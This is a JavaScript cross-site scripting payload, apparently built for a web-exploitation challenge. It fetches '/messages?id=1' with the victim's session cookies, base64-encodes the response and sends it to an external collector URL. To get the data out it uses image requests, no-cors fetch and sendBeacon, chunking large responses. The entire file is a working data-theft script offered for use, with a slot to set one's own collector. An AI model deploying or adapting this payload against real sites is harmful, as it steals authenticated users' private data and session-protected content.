// robust-oob.js - fetch /messages and exfil to external collector with fallbacks & chunking
(function(){
  const END = "https://labolabo.free.beeceptor.com"; // <- set your collector
  const CHUNK = 900;   // conservative chunk size for URL GETs
  const SLEEP_MS = 120;

  function b64(s){
    try { return btoa(unescape(encodeURIComponent(String(s)))); }
    catch(e){ return btoa(String(s)); }
  }
  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }

  // make a "fire-and-forget" GET via Image (works cross-origin)
  function imgSend(path){
    try { (new Image()).src = END + path; } catch(e){}
  }
  // best-effort no-cors fetch
  function fetchNoCors(path){
    try { fetch(END + path, { mode: 'no-cors', keepalive: true }); } catch(e){}
  }
  // sendBeacon for small payloads (recommended)
  function beaconSend(path, blob){
    try {
      if (navigator.sendBeacon) { navigator.sendBeacon(END + path, blob); return true; }
    } catch(e){}
    return false;
  }

  async function exfilLarge(name, encoded){
    // send header announcing number of chunks
    const parts = [];
    for (let i=0;i<encoded.length;i+=CHUNK) parts.push(encoded.slice(i, i+CHUNK));
    // header
    imgSend("/_h/" + encodeURIComponent(name) + "/" + parts.length);
    // chunks
    for (let i=0;i<parts.length;i++){
      const p = "/" + encodeURIComponent(name) + "/" + i + "/" + encodeURIComponent(parts[i]);
      imgSend(p);
      // also attempt no-cors fetch and short sleep
      fetchNoCors("/_f/" + encodeURIComponent(name) + "/" + i);
      await sleep(SLEEP_MS);
    }
  }

  async function exfilSmall(name, encoded){
    // try sendBeacon with JSON blob first
    const body = JSON.stringify({ meta: { from: location.pathname + location.search, endpoint: name, when: Date.now() }, body: encoded });
    const blob = new Blob([body], {type: 'application/json'});
    if (beaconSend("/recv", blob)) return;
    // fallback to single GET with encoded payload in query (may be large)
    imgSend("/" + encodeURIComponent(name) + "/0/" + encodeURIComponent(encoded));
    fetchNoCors("/" + encodeURIComponent(name) + "/0/" + encodeURIComponent(encoded));
  }

  async function doFetchAndExfil(path, name){
    try {
      // fetch same-origin; cookies/session will be included automatically
      const resp = await fetch(path, { method: "GET", credentials: "include" });
      let txt = "";
      try { txt = await resp.text(); } catch(e){ txt = ""; }
      const encoded = b64(txt || "");
      // if tiny, use beacon or single GET; if big, chunk
      if (encoded.length <= CHUNK) {
        await exfilSmall(name, encoded);
      } else {
        await exfilLarge(name, encoded);
      }
    } catch (err) {
      // exfil the error string
      const encoded = b64("[error] " + String(err));
      await exfilSmall(name, encoded);
    }
  }

  (async function main(){
    try {
      // OPTIONAL: trigger /visit first (uncomment if needed)
      // try { await fetch("/visit", { method: "POST", credentials: "include", headers: {"Content-Type":"application/x-www-form-urlencoded"}, body: "id=1" }); await sleep(300); } catch(e){}

      // Primary target(s) to read as admin
      await doFetchAndExfil("/messages?id=1", "messages?id=1");
      await sleep(300);
      // add more probes here if desired:
      // await doFetchAndExfil("/messages?id=9093", "messages?id=9093");
      // await sleep(800);

    } catch(e){ 
      try { imgSend("/_err/" + encodeURIComponent(b64(String(e)))); } catch(e2){}
    }
  })();
})();
